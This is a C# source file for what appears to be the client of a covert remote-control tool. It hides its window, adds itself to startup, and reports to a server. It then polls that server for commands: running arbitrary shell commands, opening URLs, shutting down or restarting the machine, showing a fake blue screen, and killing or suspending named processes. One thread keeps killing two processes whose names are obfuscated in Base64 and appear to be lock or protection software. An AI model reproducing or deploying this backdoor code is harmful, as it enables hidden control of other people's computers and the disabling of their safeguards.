using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;

namespace Core
{
    class Program
    {
        static void Main(string[] args){
            AppLibrary.Hide();
            Console.ForegroundColor = ConsoleColor.Yellow;
            while (Struct.Lan == false){
                if (CoreLibrary.CheckServer() == true){
                    Struct.Lan = true;
                }
            }
            if (CoreLibrary.CheckID() == false){
                Register RegisterForm = new Register();
                RegisterForm.ShowDialog();
            }
            else{
                Struct.ID = Core_Regedit.Read("ID");
                CoreLibrary.CreateData();
                CoreLibrary.SendStatus(Struct.ID);
                CoreLibrary.SendData(Struct.ID, CoreLibrary.CreateData());
                Core_Regedit.AddStatup();
                Thread Thread1 = new Thread(new ThreadStart(SendStatus)); Thread1.Start();
                Thread Thread2 = new Thread(new ThreadStart(SendData)); Thread2.Start();
                Thread Thread3 = new Thread(new ThreadStart(CheckTask)); Thread3.Start();
                Thread Thread4 = new Thread(new ThreadStart(Killer)); Thread4.Start();
            }
        }

        static void SendStatus(){
            while (true){
                CoreLibrary.SendStatus(Struct.ID);
                System.Threading.Thread.Sleep(60000);
            }
        }

        static void SendData(){
            while (true){
                CoreLibrary.SendData(Struct.ID, CoreLibrary.CreateData());
                System.Threading.Thread.Sleep(10000);
            }
        }

        static void CheckTask(){
            while (true){
                try{
                    string data = CoreLibrary.ChechTask(Struct.ID);
                    if (data == "shutdown"){
                        if (CoreLibrary.SendTaskReset(Struct.ID) == "TRUE"){
                            Struct.Command("shutdown -s -t 1");
                        }
                    }
                    else if (data == "restart"){
                        if (CoreLibrary.SendTaskReset(Struct.ID) == "TRUE"){
                            Struct.Command("shutdown -r -t 1");
                        }
                    }
                    else if (data == "sleep"){
                        if (CoreLibrary.SendTaskReset(Struct.ID) == "TRUE"){
                            Application.SetSuspendState(PowerState.Suspend, false, false);
                        }
                    }
                    else if (data == "bluescreen"){
                        if (CoreLibrary.SendTaskReset(Struct.ID) == "TRUE"){
                            BsodLibrary.Show();
                        }
                    }
                    else if (data == "killerstart"){
                        if (CoreLibrary.SendTaskReset(Struct.ID) == "TRUE"){
                            Struct.KillerPower = true;
                        }
                    }
                    else if (data == "killerstop"){
                        if (CoreLibrary.SendTaskReset(Struct.ID) == "TRUE"){
                            Struct.KillerPower = false;
                        }
                    }
                    else if (data == "killersuspend"){
                        if (CoreLibrary.SendTaskReset(Struct.ID) == "TRUE"){
                            Process[] Processes = Process.GetProcesses();
                            foreach (Process p in Processes){
                                if (p.ProcessName == EncryptionLibrary.Base64Decode("dXNia2V5")){
                                    SuspendLibrary.SuspendProcess(p.Id);
                                }
                                if (p.ProcessName == EncryptionLibrary.Base64Decode("ZWtpbGl0")){
                                    SuspendLibrary.SuspendProcess(p.Id);
                                }
                            }
                        }
                    }
                    else if (data == "killerresume"){
                        if (CoreLibrary.SendTaskReset(Struct.ID) == "TRUE"){
                            Process[] Processes = Process.GetProcesses();
                            foreach (Process p in Processes){
                                if (p.ProcessName == EncryptionLibrary.Base64Decode("dXNia2V5")){
                                    SuspendLibrary.ResumeProcess(p.Id);
                                }
                                if (p.ProcessName == EncryptionLibrary.Base64Decode("ZWtpbGl0")){
                                    SuspendLibrary.ResumeProcess(p.Id);
                                }
                            }
                        }
                    }
                    else if (data == "showtaskbar"){
                        if (CoreLibrary.SendTaskReset(Struct.ID) == "TRUE"){
                            TaskbarLibrary.Show();
                        }
                    }
                    else if (data == "hidetaskbar"){
                        if (CoreLibrary.SendTaskReset(Struct.ID) == "TRUE"){
                            TaskbarLibrary.Hide();
                        }  
                    }
                    else if (data.Split(',')[0] == "kill"){
                        if (CoreLibrary.SendTaskReset(Struct.ID) == "TRUE"){
                            Process[] Processes = Process.GetProcesses();
                            foreach (Process p in Processes){
                                if (p.ProcessName == data.Split(',')[1].Replace(".exe", "")){
                                    p.Kill();
                                }
                            }
                            Struct.Command("taskkill /IM " + data.Split(',')[1]);
                        }
                    }
                    else if (data.Split(',')[0] == "suspend"){
                        if (CoreLibrary.SendTaskReset(Struct.ID) == "TRUE"){
                            Process[] Processes = Process.GetProcesses();
                            foreach (Process p in Processes){
                                if (p.ProcessName == data.Split(',')[1].Replace(".exe", "")){
                                    SuspendLibrary.SuspendProcess(p.Id);
                                }
                            }
                        }
                    }
                    else if (data.Split(',')[0] == "resume"){
                        if (CoreLibrary.SendTaskReset(Struct.ID) == "TRUE"){
                            Process[] Processes = Process.GetProcesses();
                            foreach (Process p in Processes){
                                if (p.ProcessName == data.Split(',')[1].Replace(".exe", "")){
                                    SuspendLibrary.ResumeProcess(p.Id);
                                }
                            }
                        }
                    }
                    else{
                        string[] array = data.Split(',');
                        if (array[0] == "cmd"){
                            string come = array[1];
                            if (CoreLibrary.SendTaskReset(Struct.ID) == "TRUE"){
                                Struct.Command(come);
                            }
                        }
                        else if (array[0] == "url"){
                            string come = array[1];
                            if (CoreLibrary.SendTaskReset(Struct.ID) == "TRUE"){
                                System.Diagnostics.Process.Start(come);
                            }
                        }
                        else if (array[0] == "box"){
                            string come = array[1];
                            if (CoreLibrary.SendTaskReset(Struct.ID) == "TRUE"){
                                MessageBox.Show(come, "");
                            }
                        }
                        else{
                            CoreLibrary.SendTaskReset(Struct.ID);
                        }
                    }
                }
                catch {}
                System.Threading.Thread.Sleep(5000);
            }
        }

        static void Killer(){
            while (true){
                try{
                    if (Struct.KillerPower == true){
                        TaskbarLibrary.Show();
                        Process[] Processes = Process.GetProcesses();
                        foreach (Process p in Processes){
                            if (p.ProcessName == EncryptionLibrary.Base64Decode("dXNia2V5"))
                            {
                                p.Kill();
                            }
                            if (p.ProcessName == EncryptionLibrary.Base64Decode("ZWtpbGl0"))
                            {
                                p.Kill();
                            }
                        }
                        System.Threading.Thread.Sleep(100);
                    }
                }
                catch{}
            }
        }
    }
}
